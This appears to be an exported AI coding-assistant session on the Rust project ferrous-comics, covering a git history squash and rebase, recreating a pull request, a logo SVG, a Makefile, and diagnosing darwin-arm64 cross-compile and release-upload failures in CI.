message.content: I accidentally merged PR #1 as a series of commits instead of a squash merge. Rewrite the history of the repo on branch main so it's just one initial commit of everything, using the PR message I tried to make (I can review that before you apply it). Then fix my current branch with that new history

3ee2042363ba9c903b21c47d0090027701a5998f Rust rewrite of xkcd_checker #1
- Complete rewrite of [xkcd_checker](https://github.com/bryanhiestand/xkcd_checker) in Rust
- Same `XKCD_*` environment variable config interface as the original
- Single compiled binary; no runtime dependencies

## Key changes from the Python version

- **HTTP**: `reqwest` (blocking) replaces `requests`
- **Email**: `lettre` replaces `smtplib` — supports STARTTLS and image attachments
- **JSON**: `serde` / `serde_json` replaces manual dict access
- **Config**: `dotenvy` replaces `python-dotenv`
- **Errors**: `anyhow` propagation replaces `sys.exit()` calls throughout
- **Retry logic removed**: cron handles retries via non-zero exit code, no sleep needed
4cfac5e83ef35d9bf5e0c1e85dae9bdcbd855c5d Address Copilot feedback: pin tool versions, untrack local settings
- Pin ziglang==0.15.2 and cargo-zigbuild==0.22.1 in release workflow
  for reproducible builds (--locked ensures Cargo.lock is respected)
- Add .claude/settings.local.json to .gitignore and remove from tracking;
  it contains machine-specific paths and permissions

Co-Authored-By: Claude Sonnet 4.6 <noreply@anthropic.com>
Entire-Checkpoint: f1f0a51ff2ec

b253c44a699fcf7e82dda2636d03076a2f6e895c simplify: replace ^ with != for credentials validation
XOR on bools and != are equivalent; != reads more clearly in context.

Force-pushing `history-to-redb` rewrote its commit SHAs. GitHub tracks PRs by commit history — when it processed the force-push, it saw that the new branch history no longer had any connection to the old base commits, and automatically closed the PR.

You can reopen it: go to the PR on GitHub and click **Reopen pull request**. The diff should be correct now (the rebased commits against the new single-commit main).

content.text: GitHub sometimes permanently prevents reopening when a force-push rewrites the branch root. You'll need to create a new PR:

input.command: gh pr view 2 --json title,body 2>/dev/null || gh pr list --state closed --json number,title,body | head -50
input.description: Check if there's a closed PR to get its title/body

content.content:
{"body":"## Summary

- Replaces the flat `xkcd_history.txt` file with a [redb](https://github.com/cberner/redb) embedded database — pure Rust, no C/FFI, ACID-compliant
- Tracks richer per-comic state: `first_seen_utc`, `image_downloaded`, `email_sent`, `email_sent_utc`
- Marks comics as seen *before* attempting download/email, preventing duplicate sends if the process is re-run after a partial failure
- One-time migration: existing `xkcd_history.txt` is imported on first run and renamed to `xkcd_history.txt.migrated`
- New optional config: `XKCD_DB_PATH` (default: `xkcd_comics.db`)

## Test plan

- [x] `cargo build` succeeds with no C build scripts in the output
- [x] `cargo clippy -- -D warnings` and `cargo fmt --check` pass
- [x] Run binary with an existing `xkcd_history.txt` — verify it is renamed to `.migrated` and DB is created
- [x] Run binary a second time — verify it exits early ("already seen") without re-sending
- [x] Inspect `xkcd_comics.db` records to confirm `email_sent: true` and `email_sent_utc` is set after a successful run
- [x] Verify CI passes (fmt, clippy, test) on all targets

🤖 Generated with [Claude Code](https://claude.com/claude-code)","title":"Replace xkcd_history.txt with redb embedded database (v1.1.0)"}

input.command:
gh pr create --title "Replace xkcd_history.txt with redb embedded database (v1.1.0)" --body "$(cat <<'EOF'
## Summary

- Replaces the flat `xkcd_history.txt` file with a [redb](https://github.com/cberner/redb) embedded database — pure Rust, no C/FFI, ACID-compliant
- Tracks richer per-comic state: `first_seen_utc`, `image_downloaded`, `email_sent`, `email_sent_utc`
- Marks comics as seen *before* attempting download/email, preventing duplicate sends if the process is re-run after a partial failure
- One-time migration: existing `xkcd_history.txt` is imported on first run and renamed to `xkcd_history.txt.migrated`
- New optional config: `XKCD_DB_PATH` (default: `xkcd_comics.db`)

## Test plan

- [x] `cargo build` succeeds with no C build scripts in the output
- [x] `cargo clippy -- -D warnings` and `cargo fmt --check` pass
- [x] Run binary with an existing `xkcd_history.txt` — verify it is renamed to `.migrated` and DB is created
- [x] Run binary a second time — verify it exits early ("already seen") without re-sending
- [x] Inspect `xkcd_comics.db` records to confirm `email_sent: true` and `email_sent_utc` is set after a successful run
- [x] Verify CI passes (fmt, clippy, test) on all targets

🤖 Generated with [Claude Code](https://claude.com/claude-code)
EOF
)" --base main --head history-to-redb

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 640" width="1280" height="640">
  <defs>
    <!-- Repeating dot grid for subtle comic-book texture -->
    <pattern id="dots" x="0" y="0" width="32" height="32" patternUnits="userSpaceOnUse">
      <circle cx="16" cy="16" r="2" fill="#2A2A2E"/>
    </pattern>

    <!-- White outline filter, reused on the bubble group -->
    <filter id="bubble-outline" x="-5%" y="-5%" width="110%" height="110%">
      <feMorphology in="SourceAlpha" operator="dilate" radius="10" result="expanded"/>
      <feFlood flood-color="white" result="color"/>
      <feComposite in="color" in2="expanded" operator="in" result="outline"/>
      <feMerge>
        <feMergeNode in="outline"/>
        <feMergeNode in="SourceGraphic"/>
      </feMerge>
    </filter>

    <!-- Right-side text gradient: fades in from left -->
    <linearGradient id="text-fade" x1="0" y1="0" x2="1" y2="0">
      <stop offset="0%" stop-color="#18181B"/>
      <stop offset="12%" stop-color="transparent"/>
    </linearGradient>
  </defs>

  <!-- ── Background ── -->
  <rect width="1280" height="640" fill="#18181B"/>
  <!-- Dot texture across the full canvas -->
  <rect width="1280" height="640" fill="url(#dots)"/>
  <!-- Soft left-to-right vignette so the bubble side feels darker/richer -->
  <rect width="1280" height="640" fill="url(#text-fade)"/>

  <!-- ── Left panel: speech bubble logo ── -->
  <!-- Bubble designed to sit centered at roughly (240, 310) in the left 480px -->
  <g filter="url(#bubble-outline)">
    <rect x="64" y="72" width="352" height="276" rx="44" fill="#D4551F"/>
    <!-- Tail top points inside rect bottom (72+276=348) so fills merge -->
    <polygon points="114,336  90,494  214,336" fill="#D4551F"/>
  </g>

  <!-- Fe centered in bubble body: x=64+176=240, y=72+138=210 -->
  <text
    x="240" y="210"
    font-family="Georgia, 'Times New Roman', serif"
    font-size="188" font-weight="bold"
    text-anchor="middle" dominant-baseline="central"
    fill="white">Fe</text>

  <!-- ── Vertical divider ── -->
  <line x1="496" y1="80" x2="496" y2="560" stroke="#D4551F" stroke-width="3" stroke-linecap="round" opacity="0.6"/>

  <!-- ── Right panel: project identity ── -->

  <!-- "ferrous" – rust orange, large -->
  <text
    x="556" y="224"
    font-family="'Arial Black', Impact, 'Helvetica Neue', sans-serif"
    font-size="116" font-weight="900"
    text-anchor="start" dominant-baseline="auto"
    fill="#D4551F"
    letter-spacing="-2">ferrous</text>

  <!-- "comics" – white, same size, sits below -->
  <text
    x="556" y="360"
    font-family="'Arial Black', Impact, 'Helvetica Neue', sans-serif"
    font-size="116" font-weight="900"
    text-anchor="start" dominant-baseline="auto"
    fill="white"
    letter-spacing="-2">comics</text>

  <!-- Thin orange rule beneath the title block -->
  <line x1="556" y1="388" x2="1220" y2="388" stroke="#D4551F" stroke-width="3" stroke-linecap="round" opacity="0.7"/>

  <!-- Tagline -->
  <text
    x="558" y="440"
    font-family="Georgia, 'Times New Roman', serif"
    font-size="32" font-style="italic"
    text-anchor="start" dominant-baseline="auto"
    fill="#A0A0A8">xkcd, delivered to your inbox</text>

  <!-- Tech-stack badges -->
  <text
    x="558" y="510"
    font-family="'Courier New', 'Courier', monospace"
    font-size="22"
    text-anchor="start" dominant-baseline="auto"
    fill="#606068"
    letter-spacing="1">● Pure Rust  ·  No C deps  ·  SMTP  ·  redb</text>

  <!-- Subtle repo path at bottom -->
  <text
    x="558" y="562"
    font-family="'Courier New', 'Courier', monospace"
    font-size="20"
    text-anchor="start" dominant-baseline="auto"
    fill="#404048">github.com/bryanhiestand/ferrous-comics</text>
</svg>

file.content:
.PHONY: build release check fmt fmt-check lint test clean run dump install

## Default target
build:
	cargo build

## Optimized release build
release:
	cargo build --release

## Run all checks (format + lint + test)
check: fmt-check lint test

## Format source code in place
fmt:
	cargo fmt

## Check formatting without writing
fmt-check:
	cargo fmt --check

## Lint with warnings as errors (mirrors CI)
lint:
	cargo clippy -- -D warnings

## Run tests
test:
	cargo test

## Remove build artifacts
clean:
	cargo clean

## Run the binary (debug build)
run:
	cargo run

## Dump all comic history records as newline-delimited JSON
dump:
	cargo run -- dump

## Install release binary to ~/.cargo/bin
install:
	cargo install --path .

content.text:
Perfect! Now I have enough information to diagnose the issue. Let me compile my findings:

## Diagnostic Report: CI Build Failure for `aarch64-apple-darwin`

### Root Cause
The build failure is caused by a **transitive dependency chain introduced by PR #3's `redb` addition**. The dependency chain is:

```
chrono (in Cargo.toml)
  └─ iana-time-zone v0.1.65
     └─ core-foundation-sys v0.8.7
```

And separately:
```
env_logger (indirect dependency)
  └─ jiff v0.2.23
     └─ (uses core-foundation for timezone handling on macOS)
```

**The problem:** When cross-compiling to `aarch64-apple-darwin` on Ubuntu using `cargo-zigbuild`, the build system cannot locate the `CoreFoundation` framework because:

1. `core-foundation-sys` and `jiff` contain native code that requires macOS system frameworks
2. Running on a Linux host (`ubuntu-latest`) means those frameworks don't exist
3. While `cargo-zigbuild` can cross-compile Rust code, it cannot provide macOS-specific system frameworks on a Linux build machine

### Key Files

**Cargo.toml** (lines 1-17):
- Added `redb = "2"` as a direct dependency (line 16)
- This is clean, but the issue is in transitive dependencies

**Cargo.lock** - Key entries:
- Line 494-506: `iana-time-zone v0.1.65` depends on `core-foundation-sys v0.8.7`
- Line 648-657: `jiff v0.2.23` (used by `env_logger` for logging timestamps)
- Line 192-195: `core-foundation-sys v0.8.7` 
- The dependency chain: `chrono` → `iana-time-zone` → `core-foundation-sys`

**release.yml** (lines 33-34):
- Step "Build darwin-arm64" runs: `cargo zigbuild --release --target aarch64-apple-darwin`
- This invokes the full build, which tries to compile all dependencies including those requiring `CoreFoundation.framework`

**src/main.rs** (lines 1-50):
- Line 10: `use redb::{Database, ReadableTable, TableDefinition};` - PR #3 addition
- This indirectly pulls in `jiff` for time handling

### Why This Happens

The `iana-time-zone` crate declares `core-foundation-sys` as a dependency because it needs it on macOS targets. However, the build environment (Ubuntu) doesn't provide macOS system headers or frameworks. The `cargo-zigbuild` tool uses Zig's C/C++ toolchain, but it still expects the system frameworks to exist when building for Apple targets.

### Summary of Transitive Dependency Chain

```
ferrous-comics v0.1.0
├── chrono v0.4.44
│   └── iana-time-zone v0.1.65
│       └── core-foundation-sys v0.8.7  ← CANNOT COMPILE ON LINUX FOR macOS
└── env_logger v0.11.9
    └── jiff v0.2.23
        └── (Also references CoreFoundation on macOS)
```

### Files Examined

1. `/Users/bryan/git/bryanhiestand/ferrous-comics/Cargo.toml` - Direct dependencies
2. `/Users/bryan/git/bryanhiestand/ferrous-comics/Cargo.lock` - Transitive dependency resolution (lines 165-506+ contain relevant entries)
3. `/Users/bryan/git/bryanhiestand/ferrous-comics/.github/workflows/release.yml` - CI/CD configuration
4. `/Users/bryan/git/bryanhiestand/ferrous-comics/src/main.rs` - Import statements

### Git History
- Current branch: `history-to-redb`
- Most recent commits:
  - `0db7102`: Replace xkcd_history.txt with redb embedded database (v1.1.0) (#3)
  - `84959df`: Rust rewrite of xkcd_checker

**The problem:** When cross-compiling to `aarch64-apple-darwin` on Ubuntu using `cargo-zigbuild`, the build system cannot locate the `CoreFoundation` framework because:

1. `core-foundation-sys` and `jiff` contain native code that requires macOS system frameworks
2. Running on a Linux host (`ubuntu-latest`) means those frameworks don't exist
3. While `cargo-zigbuild` can cross-compile Rust code, it cannot provide macOS-specific system frameworks on a Linux build machine

### Key Files

**Cargo.toml** (lines 1-17):
- Added `redb = "2"` as a direct dependency (line 16)
- This is clean, but the issue is in transitive dependencies

**Cargo.lock** - Key entries:
- Line 494-506: `iana-time-zone v0.1.65` depends on `core-foundation-sys v0.8.7`
- Line 648-657: `jiff v0.2.23` (used by `env_logger` for logging timestamps)
- Line 192-195: `core-foundation-sys v0.8.7` 
- The dependency chain: `chrono` → `iana-time-zone` → `core-foundation-sys`

**release.yml** (lines 33-34):
- Step "Build darwin-arm64" runs: `cargo zigbuild --release --target aarch64-apple-darwin`
- This invokes the full build, which tries to compile all dependencies including those requiring `CoreFoundation.framework`

**src/main.rs** (lines 1-50):
- Line 10: `use redb::{Database, ReadableTable, TableDefinition};` - PR #3 addition
- This indirectly pulls in `jiff` for time handling

### Why This Happens

The `iana-time-zone` crate declares `core-foundation-sys` as a dependency because it needs it on macOS targets. However, the build environment (Ubuntu) doesn't provide macOS system headers or frameworks. The `cargo-zigbuild` tool uses Zig's C/C++ toolchain, but it still expects the system frameworks to exist when building for Apple targets.

### Summary of Transitive Dependency Chain

```
ferrous-comics v0.1.0
├── chrono v0.4.44
│   └── iana-time-zone v0.1.65
│       └── core-foundation-sys v0.8.7  ← CANNOT COMPILE ON LINUX FOR macOS
└── env_logger v0.11.9
    └── jiff v0.2.23
        └── (Also references CoreFoundation on macOS)
```

### Files Examined

1. `/Users/bryan/git/bryanhiestand/ferrous-comics/Cargo.toml` - Direct dependencies
2. `/Users/bryan/git/bryanhiestand/ferrous-comics/Cargo.lock` - Transitive dependency resolution (lines 165-506+ contain relevant entries)
3. `/Users/bryan/git/bryanhiestand/ferrous-comics/.github/workflows/release.yml` - CI/CD configuration
4. `/Users/bryan/git/bryanhiestand/ferrous-comics/src/main.rs` - Import statements

### Git History
- Current branch: `history-to-redb`
- Most recent commits:
  - `0db7102`: Replace xkcd_history.txt with redb embedded database (v1.1.0) (#3)
  - `84959df`: Rust rewrite of xkcd_checker
Let me read the key files directly before finalizing the plan.

file.content:
name: Release

on:
  push:
    tags:
      - 'v*'

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
      - uses: dtolnay/rust-toolchain@e97e2d8cc328f1b50210efc529dca0028893a2d9  # stable
        with:
          toolchain: stable
          targets: x86_64-unknown-linux-gnu,aarch64-unknown-linux-gnu,aarch64-apple-darwin
      - uses: Swatinem/rust-cache@c19371144df3bb44fab255c43d04cbc2ab54d1c4  # v2.9.1

      - name: Install zig
        run: pip3 install ziglang==0.15.2

      - name: Install cargo-zigbuild
        run: cargo install --locked cargo-zigbuild --version 0.22.1

      - name: Build linux-amd64
        run: cargo zigbuild --release --target x86_64-unknown-linux-gnu

      - name: Build linux-arm64
        run: cargo zigbuild --release --target aarch64-unknown-linux-gnu

      - name: Build darwin-arm64
        run: cargo zigbuild --release --target aarch64-apple-darwin

      - name: Collect binaries
        run: |
          cp target/x86_64-unknown-linux-gnu/release/ferrous-comics ferrous-comics-linux-amd64
          cp target/aarch64-unknown-linux-gnu/release/ferrous-comics ferrous-comics-linux-arm64
          cp target/aarch64-apple-darwin/release/ferrous-comics ferrous-comics-darwin-arm64

      - uses: softprops/action-gh-release@153bb8e04406b158c6c84fc1615b65b24149a1fe  # v2.6.1
        with:
          files: |
            ferrous-comics-linux-amd64
            ferrous-comics-linux-arm64
            ferrous-comics-darwin-arm64

content.text: Now the picture is clear. In `env_logger` 0.11.9, `humantime = ["dep:jiff"]` — so the default `humantime` feature now pulls in `jiff` → `iana-time-zone` → `core-foundation-sys`. Combined with `chrono`'s `clock` feature doing the same thing, both chains need to be cut.

input.content:
# Plan: Fix darwin-arm64 cross-compilation failure

## Context

After merging PR #3 (redb branch), the release CI fails to cross-compile `aarch64-apple-darwin` on `ubuntu-latest`. The linker (cargo-zigbuild + zig) can't find `CoreFoundation.framework` because two dependency chains now require it:

1. `chrono` (with `clock` feature) → `iana-time-zone` → `core-foundation-sys`
2. `env_logger` (default features) → `humantime` feature → `jiff` → `iana-time-zone` → `core-foundation-sys`

`env_logger` 0.11.9 renamed `humantime` to wrap `jiff` instead of the `humantime` crate, so the default feature set now pulls in `jiff`.

## Files to modify

- `Cargo.toml`
- `src/main.rs`

## Changes

### `Cargo.toml`

**Remove `clock` from chrono** (clock is only needed for `Utc::now()` / `Local::now()`; `NaiveDate` doesn't need it):
```toml
# before
chrono = { version = "0.4", default-features = false, features = ["std", "clock"] }
# after
chrono = { version = "0.4", default-features = false, features = ["std"] }
```

**Disable env_logger's humantime/jiff** (timestamps in log lines are not critical for a cron binary):
```toml
# before
env_logger = "0.11"
# after
env_logger = { version = "0.11", default-features = false, features = ["auto-color", "regex"] }
```

### `src/main.rs`

Replace both calls to `chrono::Utc::now().timestamp()` (lines ~178 and ~206) with stdlib:
```rust
std::time::SystemTime::now()
    .duration_since(std::time::UNIX_EPOCH)
    .unwrap_or_default()
    .as_secs() as i64
```

The `chrono::NaiveDate::from_ymd_opt` call (line ~281) is unaffected — `NaiveDate` doesn't require the `clock` feature.

## Verification

```bash
cargo build                        # confirm it compiles
cargo clippy -- -D warnings        # confirm no new warnings
cargo fmt --check                  # confirm formatting
# Confirm core-foundation-sys is gone from the dep tree:
cargo tree | grep -E "core-foundation|iana-time-zone|jiff"
```

For the cross-compile check, the CI will confirm on the next tag push.

The user wants to collapse all 11 commits (including the original Initial commit) into a single commit using the PR message, then rebase `history-to-redb` (which has 6 commits ahead of main) onto the new single-commit history. ## Current State **main** (11 commits, oldest→newest): ``` 0ccb6a2 Initial commit 7b25a39 Rewrite in Rust, replacing xkcd_checker f5d0d09 Fix review issues: rename smtp_ttls, add alt text, fix comic link 3aeb13a Address Copilot PR review feedback ab86c72 Add CI and release workflows; switch to rustls f097fd8 cargo fmt 5c0a62b Fix clippy: unwrap_or_else -> unwrap_or in local_filename e26dac7 Add CLAUDE.md b253c44 simplify: replace ^ with != for credentials validation 4cfac5e Address Copilot feedback: pin tool versions, untrack local settings 3ee2042 Rust rewrite of xkcd_checker #1 ← HEAD ``` **history-to-redb** (6 commits ahead of main): ``` 459f6fd Replace xkcd_history.txt with redb embedded database 4ef7430 Add dump subcommand, Makefile, and database docs 1058724 Add GitHub logo and social preview graphics 2eadeb5 Ignore generated social-preview.png e7a17ae Add logo to README e745f28 Use social preview SVG as README banner ← HEAD ``` ## Proposed New Commit Message (for user approval) ``` Rust rewrite of xkcd_checker ## Summary - Complete rewrite of xkcd_checker in Rust - Same `XKCD_*` environment variable config interface as the original - Single compiled binary; no runtime dependencies ## Key changes from the Python version - **HTTP**: `reqwest` (blocking) replaces `requests` - **Email**: `lettre` replaces `smtplib` — supports STARTTLS and image attachments - **JSON**: `serde` / `serde_json` replaces manual dict access - **Config**: `dotenvy` replaces `python-dotenv` - **Errors**: `anyhow` propagation replaces `sys.exit()` calls throughout - **Retry logic removed**: cron handles retries via non-zero exit code, no sleep needed ## Test plan - [x] `cargo build --release` compiles cleanly - [x] `cargo run` with valid `.env` fetches comic, emails, writes `xkcd_history.txt` - [x] Running again immediately detects comic as already seen and exits 0 - [x] `XKCD_DOWNLOAD=false` skips download, email still sends with `` - [x] `XKCD_MAIL_ATTACHMENT=true` attaches image file to email ``` ## Implementation Steps ### Step 1 — Squash main to a single commit Use `git commit-tree` to create a new commit with main's current tree but no parent (orphan), then hard-reset main to it: ```bash # On main branch git checkout main # Create a new root commit with the current tree and the PR message NEW=$(git commit-tree HEAD^{tree} -m "$(cat <<'EOF' Rust rewrite of xkcd_checker ## Summary ... EOF )") # Point main at the new single commit git reset --hard "$NEW" ``` Result: `main` has exactly 1 commit with the same file state as before. ### Step 2 — Rebase history-to-redb onto new main ```bash git checkout history-to-redb # Replay the 6 commits (after old 3ee2042) onto the new single commit git rebase --onto main 3ee2042 history-to-redb ``` Result: `history-to-redb` has 7 commits total (1 root + 6 rebased). ### Step 3 — Force-push (only if user wants to update remote) ```bash git push --force origin main git push --force origin history-to-redb ``` **This step requires explicit user confirmation** — it rewrites published history. ## Verification After the rewrite: - `git log --oneline main` → exactly 1 commit - `git log --oneline history-to-redb ^main` → exactly 6 commits (same content as before) - `git diff main` → empty (same file state) - `cargo build` on both branches compiles cleanly

content.text:
**Root cause:** Two dependency chains both require `CoreFoundation` on macOS targets:

1. `chrono` (`clock` feature) → `iana-time-zone` → `core-foundation-sys`
2. `env_logger` 0.11.9 default → `humantime` feature (now backed by `jiff`) → `iana-time-zone` → `core-foundation-sys`

**Fix:** Cut both chains with minimal changes:
- Remove `"clock"` from `chrono` features; replace the two `Utc::now().timestamp()` calls with `std::time::SystemTime::now()...as_secs() as i64`
- Add `default-features = false, features = ["auto-color", "regex"]` to `env_logger` (loses log timestamps, which is fine for a cron binary)
- The `NaiveDate` usage in the code is unaffected — it doesn't need `clock`

input.plan:
# Plan: Fix darwin-arm64 cross-compilation failure

## Context

After merging PR #3 (redb branch), the release CI fails to cross-compile `aarch64-apple-darwin` on `ubuntu-latest`. The linker (cargo-zigbuild + zig) can't find `CoreFoundation.framework` because two dependency chains now require it:

1. `chrono` (with `clock` feature) → `iana-time-zone` → `core-foundation-sys`
2. `env_logger` (default features) → `humantime` feature → `jiff` → `iana-time-zone` → `core-foundation-sys`

`env_logger` 0.11.9 renamed `humantime` to wrap `jiff` instead of the `humantime` crate, so the default feature set now pulls in `jiff`.

## Files to modify

- `Cargo.toml`
- `src/main.rs`

## Changes

### `Cargo.toml`

**Remove `clock` from chrono** (clock is only needed for `Utc::now()` / `Local::now()`; `NaiveDate` doesn't need it):
```toml
# before
chrono = { version = "0.4", default-features = false, features = ["std", "clock"] }
# after
chrono = { version = "0.4", default-features = false, features = ["std"] }
```

**Disable env_logger's humantime/jiff** (timestamps in log lines are not critical for a cron binary):
```toml
# before
env_logger = "0.11"
# after
env_logger = { version = "0.11", default-features = false, features = ["auto-color", "regex"] }
```

### `src/main.rs`

Replace both calls to `chrono::Utc::now().timestamp()` (lines ~178 and ~206) with stdlib:
```rust
std::time::SystemTime::now()
    .duration_since(std::time::UNIX_EPOCH)
    .unwrap_or_default()
    .as_secs() as i64
```

The `chrono::NaiveDate::from_ymd_opt` call (line ~281) is unaffected — `NaiveDate` doesn't require the `clock` feature.

## Verification

```bash
cargo build                        # confirm it compiles
cargo clippy -- -D warnings        # confirm no new warnings
cargo fmt --check                  # confirm formatting
# Confirm core-foundation-sys is gone from the dep tree:
cargo tree | grep -E "core-foundation|iana-time-zone|jiff"
```

For the cross-compile check, the CI will confirm on the next tag push.

Now I have a comprehensive understanding of the situation. Let me provide a detailed diagnostic report:

## CI/Release Build Diagnostic Report

### Current Status Summary

The most recent Release run (v1.1.1, run ID 23395469792) **actually succeeded at the compilation step**, but failed during asset upload. This is a **release management issue, not a compilation issue**.

### Key Findings

#### 1. Build Compilation Result
- **Status**: SUCCESSFUL ✓
- All three cross-compilation targets completed without errors:
  - `x86_64-unknown-linux-gnu`
  - `aarch64-unknown-linux-gnu`
  - `aarch64-apple-darwin` (darwin-arm64)

The darwin-arm64 build completed in 1m 02s with only a warning about xcrun SDK path (expected when cross-compiling on Linux).

#### 2. Actual Failure
The Release workflow failed at the **GitHub release asset upload** step, NOT compilation:

```
[error] Cannot upload asset ferrous-comics-linux-amd64 to an immutable release.
GitHub only allows asset uploads before a release is published, so upload assets 
to a draft release before you publish it.
```

This means v1.1.1 was created as a published (immutable) release, and the upload action tried to add assets afterward.

#### 3. Dependency Analysis

**Good news**: There are NO blocking cross-compilation dependencies anymore. The problematic deps that previously prevented darwin-arm64 compilation have been eliminated:
- ✗ No `core-foundation`
- ✗ No `iana-time-zone`
- ✗ No `jiff`

**Present (safe) dependencies**:
- `stacker v0.1.23` (pulled by `lettre` → `chumsky`)
- `psm v0.1.30` (pulled by `stacker`)

Both stacker and psm are pure-Rust platform abstraction libraries that cross-compile successfully with cargo-zigbuild.

#### 4. CI/Workflow Configuration

**ci.yml** (lines 1-20):
- Runs on ubuntu-latest
- Tests: fmt, clippy, test
- Simple and clean

**release.yml** (lines 1-48):
- Triggered on `v*` tags
- Uses `cargo-zigbuild v0.22.1` (correct)
- Uses `zig v0.15.2` (correct)
- Installs all three targets correctly
- Binaries are successfully built and copied
- Uses `softprops/action-gh-release@v2.6.1` for upload

#### 5. Real Problem Identified

The release was likely created as **published** instead of **draft** before assets could be uploaded. The GitHub Actions release creation step needs modification to:
1. Create releases as draft, OR
2. Use the release action with appropriate flags to allow asset updates

### Dependency Tree Details

The only cross-compilation-sensitive deps in the tree are:
```
lettre (email)
  └── chumsky (parser)
      └── stacker v0.1.23
          ├── cfg-if v1.0.4
          ├── libc v0.2.183 (pure Rust bindings to libc)
          └── psm v0.1.30
              └── [build-deps] cc v1.2.57 (C compiler, but used only at build time)
```

These are all pure Rust + light FFI and compile successfully cross-platform with zig.

### Files Reviewed

1. `/Users/bryan/git/bryanhiestand/ferrous-comics/.github/workflows/ci.yml` - 20 lines, correct
2. `/Users/bryan/git/bryanhiestand/ferrous-comics/.github/workflows/release.yml` - 48 lines, needs release creation fix
3. `/Users/bryan/git/bryanhiestand/ferrous-comics/Cargo.toml` - dependencies are clean
4. Build logs from run 23395469792 - shows successful compilation but asset upload failure

### Conclusion

**The darwin-arm64 cross-compilation issue has been fixed** (stacker/psm compile fine with cargo-zigbuild). The current Release workflow failure is purely a GitHub release management issue: assets cannot be uploaded to already-published releases.

input.content:
# Plan: Fix v1.1.1 release + add darwin cross-compile CI check

## Context

Two separate problems:
1. **Immediate**: v1.1.1 release workflow failed at asset upload — `Cannot upload asset to an immutable release` — because a published GitHub release for v1.1.1 existed before the workflow ran. The compilation itself succeeded.
2. **Structural**: Nothing in CI validates cross-compilation for darwin-arm64 on PRs, so broken builds reach main undetected.

## Fix 1 — Delete and re-push v1.1.1 tag

The existing published release is immutable; the workflow can't upload assets to it. Delete the release + tag and re-push so the workflow creates the release fresh.

```bash
gh release delete v1.1.1 --yes --cleanup-tag
git tag -d v1.1.1
git tag v1.1.1          # re-tag current HEAD of main
git push origin v1.1.1  # triggers the release workflow again
```

No code change needed for this step.

## Fix 2 — Add darwin cross-compile job to ci.yml

### Branch
New branch from main: `ci/darwin-cross-compile-check`

### File: `.github/workflows/ci.yml`

Add a second job `cross-compile` after the existing `check` job. It reuses the same pinned SHAs and zig/cargo-zigbuild versions from `release.yml`:

```yaml
  cross-compile:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
      - uses: dtolnay/rust-toolchain@e97e2d8cc328f1b50210efc529dca0028893a2d9  # stable
        with:
          toolchain: stable
          targets: aarch64-apple-darwin
      - uses: Swatinem/rust-cache@c19371144df3bb44fab255c43d04cbc2ab54d1c4  # v2.9.1
      - name: Install zig
        run: pip3 install ziglang==0.15.2
      - name: Install cargo-zigbuild
        run: cargo install --locked cargo-zigbuild --version 0.22.1
      - name: Build darwin-arm64
        run: cargo zigbuild --release --target aarch64-apple-darwin
```

This runs the exact same compilation that release.yml runs, so any linker failure will block the PR before it can reach main.

## Verification

- After re-tagging, confirm the release workflow succeeds and assets appear on the v1.1.1 release page
- After the ci.yml PR is merged, open a test PR and confirm the `cross-compile` job runs and passes in the PR checks

toolUseResult.originalFile:
# Plan: Fix darwin-arm64 cross-compilation failure

## Context

After merging PR #3 (redb branch), the release CI fails to cross-compile `aarch64-apple-darwin` on `ubuntu-latest`. The linker (cargo-zigbuild + zig) can't find `CoreFoundation.framework` because two dependency chains now require it:

1. `chrono` (with `clock` feature) → `iana-time-zone` → `core-foundation-sys`
2. `env_logger` (default features) → `humantime` feature → `jiff` → `iana-time-zone` → `core-foundation-sys`

`env_logger` 0.11.9 renamed `humantime` to wrap `jiff` instead of the `humantime` crate, so the default feature set now pulls in `jiff`.

## Files to modify

- `Cargo.toml`
- `src/main.rs`

## Changes

### `Cargo.toml`

**Remove `clock` from chrono** (clock is only needed for `Utc::now()` / `Local::now()`; `NaiveDate` doesn't need it):
```toml
# before
chrono = { version = "0.4", default-features = false, features = ["std", "clock"] }
# after
chrono = { version = "0.4", default-features = false, features = ["std"] }
```

**Disable env_logger's humantime/jiff** (timestamps in log lines are not critical for a cron binary):
```toml
# before
env_logger = "0.11"
# after
env_logger = { version = "0.11", default-features = false, features = ["auto-color", "regex"] }
```

### `src/main.rs`

Replace both calls to `chrono::Utc::now().timestamp()` (lines ~178 and ~206) with stdlib:
```rust
std::time::SystemTime::now()
    .duration_since(std::time::UNIX_EPOCH)
    .unwrap_or_default()
    .as_secs() as i64
```

The `chrono::NaiveDate::from_ymd_opt` call (line ~281) is unaffected — `NaiveDate` doesn't require the `clock` feature.

## Verification

```bash
cargo build                        # confirm it compiles
cargo clippy -- -D warnings        # confirm no new warnings
cargo fmt --check                  # confirm formatting
# Confirm core-foundation-sys is gone from the dep tree:
cargo tree | grep -E "core-foundation|iana-time-zone|jiff"
```

For the cross-compile check, the CI will confirm on the next tag push.

# Plan: Fix v1.1.1 release + add darwin cross-compile CI check

## Context

Two separate problems:
1. **Immediate**: v1.1.1 release workflow failed at asset upload — `Cannot upload asset to an immutable release` — because a published GitHub release for v1.1.1 existed before the workflow ran. The compilation itself succeeded.
2. **Structural**: Nothing in CI validates cross-compilation for darwin-arm64 on PRs, so broken builds reach main undetected.

## Fix 1 — Delete and re-push v1.1.1 tag

The existing published release is immutable; the workflow can't upload assets to it. Delete the release + tag and re-push so the workflow creates the release fresh.

```bash
gh release delete v1.1.1 --yes --cleanup-tag
git tag -d v1.1.1
git tag v1.1.1          # re-tag current HEAD of main
git push origin v1.1.1  # triggers the release workflow again
```

No code change needed for this step.

## Fix 2 — Add darwin cross-compile job to ci.yml

### Branch
New branch from main: `ci/darwin-cross-compile-check`

### File: `.github/workflows/ci.yml`

Add a second job `cross-compile` after the existing `check` job. It reuses the same pinned SHAs and zig/cargo-zigbuild versions from `release.yml`:

```yaml
  cross-compile:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
      - uses: dtolnay/rust-toolchain@e97e2d8cc328f1b50210efc529dca0028893a2d9  # stable
        with:
          toolchain: stable
          targets: aarch64-apple-darwin
      - uses: Swatinem/rust-cache@c19371144df3bb44fab255c43d04cbc2ab54d1c4  # v2.9.1
      - name: Install zig
        run: pip3 install ziglang==0.15.2
